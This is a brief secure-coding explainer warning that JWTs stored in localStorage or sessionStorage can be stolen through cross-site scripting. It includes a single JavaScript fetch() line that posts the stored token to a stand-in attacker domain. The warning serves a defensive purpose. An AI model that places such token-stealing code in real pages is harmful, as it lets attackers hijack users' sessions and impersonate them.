When you store your highly sensitive JSON Web Token (JWT) inside `localStorage` or `sessionStorage`, you are exposing it to **Cross-Site Scripting (XSS)** attacks.

### Why is it dangerous?
LocalStorage is perfectly accessible via JavaScript. If a hacker manages to inject just one line of malicious JavaScript into your website—perhaps through a compromised third-party NPM package (like an analytics script or a date picker), or through a comment section that didn't sanitize HTML—they can run this code:

```javascript
fetch('https://hakcer-domain.com/steal', {
  method: 'POST',
  body: localStorage.getItem('token')
});
```
*Poof*. Your users' active sessions are completely compromised. The attacker now has the token and can perfectly impersonate the user until the token expires.
